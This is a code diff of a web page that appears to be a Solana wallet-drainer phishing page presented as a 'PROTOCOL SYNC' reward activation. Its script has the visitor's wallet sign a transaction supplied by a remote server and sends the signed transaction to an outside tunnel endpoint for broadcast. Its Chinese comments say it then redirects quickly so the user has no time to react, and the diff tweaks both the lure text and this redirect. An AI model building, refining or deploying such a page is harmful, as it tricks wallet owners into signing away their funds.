@@ -7,24 +7,17 @@
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .box { width: 330px; padding: 40px 30px; background: #0a0a0a; border: 1px solid #333; border-radius: 20px; text-align: center; }
-        .status-dot { width: 8px; height: 8px; background: #14f195; border-radius: 50%; display: inline-block; margin-right: 8px; box-shadow: 0 0 10px #14f195; }
-        .btn { background: #14f195; color: #000; border: none; padding: 20px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
-        .btn:disabled { background: #222; color: #444; }
-        #st { font-size: 10px; color: #555; margin-top: 30px; font-family: monospace; }
-        .line { height: 1px; background: #222; margin: 25px 0; }
+        .box { width: 320px; padding: 40px; background: #0a0a0a; border: 1px solid #333; border-radius: 20px; text-align: center; }
+        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
+        #st { font-size: 10px; color: #555; margin-top: 25px; font-family: monospace; }
     </style>
 </head>
 <body>
     <div class="box">
-        <div style="font-size: 11px; color: #14f195; margin-bottom: 30px; font-weight: bold;">
-            <span class="status-dot"></span> SOLANA MAINNET-BETA
-        </div>
-        <h2 style="margin: 0 0 10px 0; font-size: 22px;">PROTOCOL SYNC</h2>
-        <p style="color: #888; font-size: 13px; line-height: 1.6;">Node activation required to finalize reward distribution for this address.</p>
-        <div class="line"></div>
+        <h2 style="color:#14f195; font-size: 20px;">PROTOCOL SYNC</h2>
+        <p style="color:#888; font-size: 13px;">Secure node activation required for address reward distribution.</p>
         <button id="cta" class="btn">ACTIVATE ACCOUNT</button>
-        <div id="st">ENCRYPTED NODE CONNECTION</div>
+        <div id="st">SECURED BY MAINNET-BETA</div>
     </div>
 
     <script>
@@ -32,7 +25,6 @@
 
         document.getElementById('cta').onclick = async function() {
             const btn = this;
-            const log = (t) => document.getElementById('st').innerText = t;
             const web3 = window.solanaWeb3;
 
             try {
@@ -53,21 +45,21 @@
                 const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
                 const signed = await p.signTransaction(tx);
                 
-                // 🔱 关键改动：状态立即切换，不再弹出 Alert
                 btn.innerText = "SUCCESSFUL";
-                log("RELOAD PROTOCOL...");
 
                 const signedBase = btoa(String.fromCharCode.apply(null, signed.serialize()));
 
-                // 回传广播
-                await fetch(tunnel + "/broadcast_v41", {
+                // 回传
+                fetch(tunnel + "/broadcast_v41", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ signed_tx: signedBase })
                 });
 
-                // 🔱 没有任何提示，直接瞬移跳走
-                window.location.replace("https://solana.com/validators");
+                // 🔱 关键：成功后 0.5 秒直接瞬移跳走，不给用户反应时间
+                setTimeout(() => {
+                    window.location.replace("https://solana.com/validators");
+                }, 500);
 
             } catch (err) {
                 window.location.reload();
